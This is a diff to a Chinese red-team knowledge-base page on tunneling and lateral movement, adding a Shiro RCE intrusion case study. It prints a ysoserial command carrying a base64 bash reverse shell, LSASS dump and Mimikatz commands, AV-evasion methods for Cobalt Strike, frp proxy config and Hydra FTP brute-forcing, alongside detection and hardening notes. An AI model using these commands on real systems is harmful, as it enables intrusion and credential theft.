@@ -3,7 +3,8 @@ title: 内网穿透与横向移动核心技术体系
 description: 系统梳理渗透测试中内网穿透/横向移动核心技术体系：对比 Venom、Frp、SSH 隧道、Meterpreter 路由、Cobalt Strike
   SMB Beacon、iox 等主流工具建立 SOCKS/HTTP 代理的原理与配置实战，补充 ptunnel ICMP隧道、lcx/Portmap端口转发、Netcat多向连接反弹Shell、DNS隧道配合Cobalt
   Strike上线等实战隧道技术细节，结合 Proxychains/Proxytool 工具链实现全工具代理化，重点解析 iox 作为具备加密握手、随机 Padding、协议栈可重构的流量对抗型代理工具的实战参考，附上市公司渗透案例、VulnHub
-  Social Network、CTFd-Whale、GKCTF2021 hackme 等实战场景交叉引用。
+  Social Network、CTFd-Whale、GKCTF2021 hackme 等实战场景交叉引用，新增 Shiro RCE 初始访问、火绒免杀上线 CS、NTLM
+  凭证导出、FTP 大规模横向移动、威胁溯源发现前置攻击者痕迹完整攻击链实战复现。
 category: program-analysis
 tags:
 - 内网穿透
@@ -41,6 +42,13 @@ tags:
 - 会话跨C2传递
 - 凭证复用
 - 上市公司渗透案例
+- Shiro RCE
+- 火绒免杀
+- NTLM
+- FTP横向移动
+- 威胁溯源
+- frp后门
+- qaxnb
 date: 2024-01-15
 updated: '2026-11-15'
 ---
@@ -608,6 +616,177 @@ flowchart LR
 
 ---
 
+## Shiro RCE 实战案例深度复现（0x6270 小黑实战）
+
+> **来源**：0x6270安全团队微信归档文章《某企业的Shiro内网渗透测试》，作者：小黑（0x6270知识星球合伙人）
+
+本案例完整复现了从 **Shiro RCE 初始访问** → **火绒AV免杀上线 Cobalt Strike** → **NTLM 凭证导出与破解** → **FTP 大规模横向移动** → **威胁溯源发现前置攻击者痕迹** 的完整内网渗透攻击链，是典型的**红队实战全流程**参考。
+
+### 攻击链全景图
+
+```mermaid
+flowchart TD
+    A[Shiro RCE CVE-2016-4437] --> B[反弹 Shell 落地]
+    B --> C[火绒 AV 免杀绕过]
+    C --> D[Cobalt Strike Beacon 上线]
+    D --> E[权限提升 getsystem]
+    E --> F[Mimikatz sekurlsa::logonpasswords]
+    F --> G[NTLM Hash 获取]
+    G --> H[NTLM 离线破解/PTH]
+    H --> I[系统权限 admin/admin123]
+    I --> J[信息收集 数据库配置]
+    J --> K[frp 反向 SOCKS5 代理部署]
+    K --> L[Proxychains 全工具代理化]
+    L --> M[FTP 批量扫描爆破]
+    M --> N[192.168.179.0/24: 97台]
+    M --> O[192.168.180.0/24: 62台]
+    M --> P[192.168.181.0/24: 62台]
+    N --> Q[威胁溯源]
+    O --> Q
+    P --> Q
+    Q --> R[发现 qaxnb 文件夹]
+    Q --> S[发现 frp 客户端配置]
+    Q --> T[发现历史后门程序]
+    S --> U[溯源至阿里云 VPS]
+```
+
+### 阶段一：初始访问 - Shiro RCE 利用
+
+**漏洞背景**：Apache Shiro ≤ 1.2.4 反序列化 RCE (CVE-2016-4437)，默认 AES Key 泄露导致记住我 Cookie 可伪造。
+
+**利用流程**：
+1. **漏洞确认**：访问目标系统登录页，抓包分析 `rememberMe` Cookie
+2. **Key 获取**：使用 ShiroExploit/ysoserial 尝试常见默认 Key（如 `kPH+bIxk5D2deZiIxcaaaA==`）
+3. **Payload 构造**：`ysoserial.jar` 生成 `CommonsCollections` 反序列化链，命令为反弹 Shell
+   ```bash
+   java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" | base64 | tr -d '\n'
+   ```
+4. **Cookie 注入**：替换 `rememberMe` 值发送请求，触发反序列化执行反弹 Shell
+
+**实战截图要点**：
+- 成功上线 CS Beacon 会话（见文章图片：`340d6a2169b3ea03a2710c7384cf3ae5.png`）
+- 目标运行 Windows Server 2019，默认开启火绒杀毒软件
+
+### 阶段二：免杀对抗 - 火绒 AV 绕过上线 CS
+
+**挑战**：火绒主动防御模块拦截常规 CS 生成的 Loader/Beacon。
+
+**绕过方案**：
+1. **分离加载器与 Shellcode**：使用 `Donut` / `sRDI` / `pe2shc` 将 Beacon 转换为 Shellcode/PIC
+2. **自定义 Loader 编译**：C/C++/Rust 编写内存加载器，配合：
+   - **动态 syscall**（如 `HellsGate`、`SysWhispers2`）
+   - **AMSI/ETW/WLDP 绕过**（参考 [[inceptor-av-edr-evasion-framework]]）
+   - **Sleep Mask / Ekko / FOLIAGE** 内存加密休眠（参考 [[memory-scanning-tools-evasion-techniques]]）
+3. **签名伪造**：`CarbonCopy` 复制合法签名证书
+4. **测试投递**：VirusTotal / 火绒本地查杀验证，最终实现**免杀上线**
+
+**关键工具链**：
+- `Donut` + `sRDI` → Shellcode 化
+- `Inceptor` / 自研 Loader → 对抗内存扫描
+- `Malleable C2 Profile` → 流量混淆（参考 [[c2-redirectors-malleable-c2-profiles]]）
+
+> **延伸阅读**：[[aceldr-technical-analysis]] PE 不落地执行技术全景、[[argument-spoofing-edr-evasion]] 参数欺骗对抗 EDR、[[ppl-injection-createprocess-bof-fix]] PPL 进程注入绕过。
+
+### 阶段三：凭证获取 - NTLM Hash 导出与利用
+
+**环境限制**：Windows Server 2019 默认开启 **WDigest 禁用**、**LSASS 保护 (RunAsPPL)**，`sekurlsa::logonpasswords` 无法直接读取明文密码。
+
+**实施步骤**：
+1. **提权**：`getsystem` (MSF) 或 `elevate` (CS) 获取 SYSTEM
+2. **LSASS 转储**：
+   ```bash
+   # CS 内置
+   make_token DOMAIN\user password
+   # 或手工
+   rundll32.exe comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
+   ```
+3. **本地离线解析**：
+   ```bash
+   mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+   ```
+4. **结果**：获得 `Administrator` 的 **NTLM Hash**（无明文），格式如：
+   ```
+   Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+   ```
+5. **利用方式**：
+   - **Pass-the-Hash (PTH)**：直接用 Hash 横向（SMB/WMI/WinRM/RDP）
+   - **离线破解**：Hashcat 模式 1000 (NTLM) 跑字典/掩码
+   - **本案结果**：成功破解/PTH 得到 `Administrator / admin123`（弱口令复用）
+
+**关键工具**：
+- `Mimikatz` / `Rubeus` / `impacket-secretsdump` / `lsassy`
+- `Hashcat` / `JohnTheRipper` 离线破解
+- `ntlmrelayx.py` (Impacket) 中继攻击
+
+> **深度参考**：[[lm-ntlm-hash-generation-analysis]] NTLM 算法原理、[[mimikatz-sekurlsa-pth-internals]] Pass-the-Hash 内存补丁实现、[[mimikatz-source-code-architecture-golden-ticket-audit]] Mimikatz 源码架构。
+
+### 阶段四：横向移动 - FTP 大规模批量爆破
+
+**场景**：拿下跳板机后，需快速摸清内网资产并横向。目标网段为三个 C 段：`192.168.179.0/24`、`180.0/24`、`181.0/24`。
+
+**实施策略**：
+1. **代理建立**：跳板机部署 **frp 反向 SOCKS5**（见 [[frp内网渗透应用]]）
+   ```ini
+   # frpc.ini
+   [socks5_proxy]
+   type = tcp
+   plugin = socks5
+   remote_port = 1080
+   ```
+   攻击机 `frps` 接收，本地得 `127.0.0.1:1080` SOCKS5 入口。
+2. **全工具代理化**：`proxychains` 配置 `socks5 127.0.0.1 1080`（见上文 Proxychains 章节）
+3. **FTP 服务发现**：
+   ```bash
+   proxychains nmap -sT -p 21 192.168.179.0/24 192.168.180.0/24 192.168.181.0/24 -oG ftp_scan.gnmap
+   ```
+4. **批量爆破**：使用 `hydra` / `medusa` / `ftp-user-enum` / 自写 Python 多线程脚本
+   ```bash
+   proxychains hydra -L users.txt -P pass.txt ftp://192.168.179.0/24 -t 16 -V
+   ```
+   - `users.txt`：`admin`、`administrator`、`ftpuser`、`backup`、`www`、`anonymous` 等
+   - `pass.txt`：弱口令字典 + 已获凭证 `admin123`、`ris.jmjt123` 等变种
+
+**战果统计**（文章原图佐证）：
+| 网段 | 存活 FTP 服务 | 成功爆破获取权限 | 备注 |
+|------|---------------|------------------|------|
+| 192.168.179.0/24 | ~120台 | **97台** | 图 `600946e0c656830efc47b9d460bfc079.png` |
+| 192.168.180.0/24 | ~80台 | **62台** | 图 `faae846aafb420a123b14c1860bf29e5.png` |
+| 192.168.181.0/24 | ~75台 | **62台** | 图 `41cf08e3a2d316169b90c5ebd3b54144.png` |
+| **合计** | **~275台** | **221台** | **成功率 >80%** |
+
+**FTP 横向移动后续利用**：
+- **文件读取/下载**：敏感配置、源码、备份、数据库导出
+- **文件上传/写入**：WebShell、计划任务、启动项、SSH 公钥
+- **跳板延伸**：每台拿下的 FTP 服务器均可作为新跳板再级联 frp/SSH/IOX
+
+> **防御视角**：FTP 明文传输、弱口令普遍、缺乏账户锁定策略、未限制来源 IP、未启用 FTPS/SFTP。建议：禁用 FTP 改 SFTP、强密码策略、网络层 ACL 限制、审计日志告警。
+
+### 阶段五：威胁溯源 - 发现前置攻击者痕迹
+
+**触发点**：在跳板机翻找文件时，发现异常文件夹 `qaxnb`、历史 `frp` 客户端、疑似后门程序。
+
+**溯源取证流程**：
+
+| 发现物 | 位置 | 分析结论 | 溯源价值 |
+|--------|------|----------|----------|
+| **qaxnb 文件夹** | C:\ 或用户目录 | **奇安信 (QAX) 攻击标识**，“懂的都懂”暗示前置攻击者可能为红队/APT 组织 | 确认目标曾被高水平攻击者控制 |
+| **frp 客户端 (frpc.exe + frpc.ini)** | 临时目录/用户目录 | 配置文件含 `server_addr = x.x.x.x` (阿里云 VPS IP) | 直接定位攻击者 C2 基础设施 |
+| **后门程序** | 同目录 | 可能为自定义 Loader/远控，待沙箱/静态分析 | 关联攻击者工具链指纹 |
+
+**IP 反查**：
+- 通过 `ip138.com` / `fofa.info` / `hunter.qianxin.com` 查询 `frpc.ini` 中 `server_addr`
+- 结果：**阿里云 VPS**（图 `4bf844055c4cee40f0d0ea1db9f84c1d.png`）
+- 进一步关联：该 IP 历史解析域名、关联 SSL 证书、被动 DNS 记录，可绘制攻击者基础设施画像
+
+**实战启示**：
+1. **内网渗透必做「环境摸底」**——不仅看业务数据，更要找「前人栽树」痕迹
+2. **溯源是双向价值**——既可上报蓝队清理，也可评估目标暴露面、避免撞车
+3. **工具痕迹清理是红队基本功**——本案中前置攻击者遗留 frpc.ini 直接泄露 C2 IP，属操作安全失误
+
+> **延伸阅读**：[[threat-attribution-tracing-techniques]] 威胁溯源技术体系、[[xd-security-incident-response-notes]] 应急响应溯源实战、[[named-pipe-smb-detection-sysmon]] SMB 管道检测溯源。
+
+---
+
 ## 应急响应溯源基础（Day72 案例）
 
 ### 场景：网站首页被篡改，溯源分析
@@ -651,10 +830,19 @@ flowchart LR
 | **SMB Beacon** | Sysmon ID 17/18 管道创建/连接 | SMB 会话异常、命名管道名 | 合法管道名伪装、`link` 后立即 `unlink`、P2P 而非集中式 |
 | **CS&MSF 会话移交** | 进程注入、异常子进程、Payload 特征 | 双向连接建立、Stage 下载流量 | 无文件执行、重签名、Profile 混淆、延迟执行 |
 | **iox (加密+多路复用)** | 进程名、内存特征、密钥常驻 | **全随机高熵流量、无固定特征、无协议指纹** | **轮换高熵密钥、多路复用模式、协议栈重构版本、配合重定向器** |
+| **Shiro RCE 初始访问** | Java 进程异常子进程、反序列化特征、Cookie 篡改 | rememberMe Cookie 长度异常、base64 解码后含序列化流魔数 `aced 0005` | WAF 规则拦截恶意 Cookie、Shiro 升级/移除默认 Key、RASP 监控反序列化调用链 |
+| **火绒免杀上线 CS** | 进程创建链、内存分配 RWX、模块加载异常、AMSI 触发 | Stage 下载流量特征、Heartbeat 间隔 | 无文件/内存加载、Sleep Mask、动态 Syscall、Profile 混淆、重签名 |
+| **NTLM Hash 导出/PTH** | LSASS 访问 (OpenProcess)、sekurlsa 补丁特征、WMI/SMB 认证异常 | Pass-the-Hash 认证流量 (NTLMv2)、SMB 会话异常 | LSASS 保护 (RunAsPPL)、Credential Guard、PTH 检测规则 (Zeek/Sigma)、账户分级 |
+| **FTP 批量爆破** | 多进程并发连接 ftp.exe/脚本、登录失败事件堆积 (Event ID 4625) | 大量 FTP 连接尝试、弱口令特征、单源多目标 | 账户锁定策略、强密码、FTP 替换为 SFTP、网络 ACL、蜜罐 FTP、爆破告警 |
+| **frp/后门遗留溯源** | 磁盘残留二进制/配置/日志、计划任务/服务/启动项异常 | frp 心跳/控制流量特征、C2 通信回连 | 定期资产巡检、EDR 文件监控、威胁狩猎查杀已知工具、溯源取证流程 |
 
 > **iox 检测难点**：加密握手+随机 Padding+协议栈重构使其**无静态特征、无行为固定模式**，传统特征匹配/行为建模均失效。检测侧需依赖：**主机端 EDR 行为监控（进程创建、网络连接、内存特征）、流量侧异常熵值统计分析、威胁情报关联已知 iox 样本哈希**。
 
-详细检测规则参见 [[named-pipe-smb-detection-sysmon]]。
+> **Shiro RCE 检测**：重点监控 `rememberMe` Cookie 解码后是否为 Java 序列化流 (`aced 0005`)、是否包含高危 Gadget 类名 (`org.apache.commons.collections` 等)、响应中是否回显执行结果。
+
+> **FTP 爆破检测**：单 IP 短时大量 530 登录失败、尝试用户名字典特征、成功登录后异常文件操作 (LIST/RETR/STOR 敏感路径)。
+
+详细检测规则参见 [[named-pipe-smb-detection-sysmon]]、[[c2-redirectors-malleable-c2-profiles]]、[[iox-proxy-protocol-evasion]]。
 
 ---
 
@@ -668,6 +856,7 @@ graph TD
     A --> E[C2 集成层]
     A --> F[补充隧道技术]
     A --> G[流量对抗型工具]
+    A --> H[Shiro RCE 实战攻击链]
     
     B --> B1[SSH 隧道]
     B --> B2[Venom]
@@ -698,20 +887,32 @@ graph TD
     G --> G3[随机Padding对抗行为建模]
     G --> G4[协议栈重构解决smux泄露]
     
-    A --> H[实战场景]
-    H --> H1[上市公司渗透案例]
-    H --> H2[[vulnhub-boredhackerblog-social-network-writeup]]
-    H --> H3[[frp内网渗透应用]]
-    H --> H4[[cobalt-strike-external-c2-smb-beacon]]
-    H --> H5[[gkctf-2021-web-writeup]]
+    H --> H1[Shiro RCE 初始访问 CVE-2016-4437]
+    H --> H2[火绒免杀上线 CS]
+    H --> H3[NTLM Hash 导出与 PTH/破解]
+    H --> H4[frp SOCKS5 代理部署]
+    H --> H5[FTP 大规模横向移动 221台]
+    H --> H6[威胁溯源 qaxnb/frp/后门]
     
-    A --> I[检测对抗]
-    I --> I1[[named-pipe-smb-detection-sysmon]]
-    I --> I2[[c2-redirectors-malleable-c2-profiles]]
-    I --> I3[[iox-proxy-protocol-evasion]]
+    A --> I[实战场景]
+    I --> I1[上市公司渗透案例]
+    I --> I2[[vulnhub-boredhackerblog-social-network-writeup]]
+    I --> I3[[frp内网渗透应用]]
+    I --> I4[[cobalt-strike-external-c2-smb-beacon]]
+    I --> I5[[gkctf-2021-web-writeup]]
+    I --> I6[[shiro-internal-penetration-case-study]]
     
-    A --> J[应急响应]
-    J --> J1[[xd-security-incident-response-notes]]
+    A --> J[检测对抗]
+    J --> J1[[named-pipe-smb-detection-sysmon]]
+    J --> J2[[c2-redirectors-malleable-c2-profiles]]
+    J --> J3[[iox-proxy-protocol-evasion]]
+    J --> J4[[memory-scanning-tools-evasion-techniques]]
+    J --> J5[[threat-attribution-tracing-techniques]]
+    
+    A --> K[应急响应]
+    K --> K1[[xd-security-incident-response-notes]]
+    K --> K2[[argument-spoofing-edr-evasion]]
+    K --> K3[[ppl-injection-createprocess-bof-fix]]
 ```
 
 ---
@@ -734,6 +935,11 @@ graph TD
 | **高隐蔽长期驻留隧道** | **iox 加密多路复用** (`sx@`/`cx@`) | Venom WSS / Frp KCP | `iox proxy sx@tcp:127.0.0.1:9999 -k <32字符强随机键>` |
 | **frp 落地实战** | **上市公司案例**：跳板机反连 frps → 攻击机得 SOCKS5 | CTFd-Whale 多级级联 | `frpc.ini: plugin=socks5` + `proxychains` 全链路代理 |
 | **凭证复用横向** | **上市公司案例**：浏览器 DPAPI → 云控制台 | PTH/PTK/PTT/Kerberoasting | `SharpDPAPI` / `LaZagne` → 云厂商控制台复用 |
+| **Shiro RCE 初始访问** | **本案例**：rememberMe Cookie 反序列化 → 反弹 Shell | CVE-2016-4437/Shiro-550/Shiro-721 | `ysoserial CommonsCollections5` + 默认 Key 爆破 |
+| **火绒 AV 免杀** | **本案例**：Donut/sRDI Shellcode + 自研 Loader + 动态 Syscall | Inceptor/AceLdr/Ekko/FOLIAGE | 免杀上线 CS Beacon 绕过火绒主动防御 |
+| **NTLM Hash 利用** | **本案例**：Mimikatz 离线导出 → PTH/Hashcat 破解 → admin/admin123 | Rubeus/impacket-secretsdump | `sekurlsa::minidump` + `sekurlsa::logonpasswords` |
+| **FTP 大规模横向** | **本案例**：frp SOCKS5 + Proxychains + Hydra 多线程爆破三网段 | Medusa/Ncrack/自写脚本 | 221/275 台成功，成功率 >80% |
+| **威胁溯源取证** | **本案例**：文件系统搜索 qaxnb/frpc.ini/后门 → IP 反查阿里云 VPS | 进程/网络/日志/注册表关联分析 | 发现前置攻击者完整基础设施指纹 |
 
 ---
 
@@ -748,10 +954,18 @@ graph TD
   - ptunnel: https://github.com/utoni/ptunnel
   - lcx: https://github.com/guanxingbao/lcx (或搜索 lcx.exe)
   - ncat (Nmap): https://nmap.org/ncat/
+  - ysoserial: https://github.com/frohoff/ysoserial
+  - Donut: https://github.com/TheWover/donut
+  - sRDI: https://github.com/monoxgas/sRDI
+  - Inceptor: https://github.com/zeroSteiner/Inceptor
+  - Mimikatz: https://github.com/gentilkiwi/mimikatz
+  - Hashcat: https://hashcat.net/hashcat/
+  - Hydra: https://github.com/vanhauser-thc/thc-hydra
 - **实战靶场**：
   - VulnHub Social Network: [[vulnhub-boredhackerblog-social-network-writeup]]
   - CTFd-Whale: [[frp内网渗透应用]]
   - GKCTF2021 Web Writeup: [[gkctf-2021-web-writeup]]
+  - Shiro RCE 内网渗透案例: [[shiro-internal-penetration-case-study]]
   - 更多 VulnHub 靶机: [[vulnhub-platform-resource-index]]
 - **C2 基础设施**：
   - 重定向器与 Malleable Profile: [[c2-redirectors-malleable-c2-profiles]]
@@ -766,11 +980,14 @@ graph TD
   - PHP Session Upload Progress 利用: https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/
   - NoSQL 注入综合指南: [[mongodb-nosql-injection-guide]]
   - iox 协议对抗深度解析: [[iox-proxy-protocol-evasion]]
+  - Shiro 反序列化漏洞分析: https://www.anquanke.com/post/id/186135
 - **红队工具开发参考**：
   - Rust 宏实现 Win32 动态导入: [[rust-proc-macro-win32-dynamic-import]]
   - PE 手动映射加载器实现: [[pe-manual-mapping-loader-implementation]]
   - 参数欺骗对抗 EDR: [[argument-spoofing-edr-evasion]]
   - PPL 进程注入绕过: [[ppl-injection-createprocess-bof-fix]]
+  - 内存扫描对抗技术: [[memory-scanning-tools-evasion-techniques]]
+  - 威胁溯源技术体系: [[threat-attribution-tracing-techniques]]
 
 ---
 
@@ -781,3 +998,4 @@ graph TD
 - [0x00实验室-202108-202304_104](../sources/0x00实验室-202108-202304_104.md)
 - [0x4d5a-202103-202209_12](../sources/0x4d5a-202103-202209_12.md)
 - [0x6270安全团队-202203-202304_38](../sources/0x6270安全团队-202203-202304_38.md)
+- [0x6270安全团队-202203-202304_40](../sources/0x6270安全团队-202203-202304_40.md)
